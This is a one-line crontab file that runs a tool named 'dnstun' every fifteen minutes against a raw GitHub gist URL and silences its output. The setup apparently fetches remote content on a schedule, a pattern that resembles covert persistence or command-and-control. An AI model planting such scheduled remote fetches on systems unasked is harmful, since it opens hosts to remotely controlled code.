# conf/crontab
*/15 * * * * /usr/local/bin/dnstun "https://gist.githubusercontent.com/maxexcloo/10565742/raw" >/dev/null 2>&1
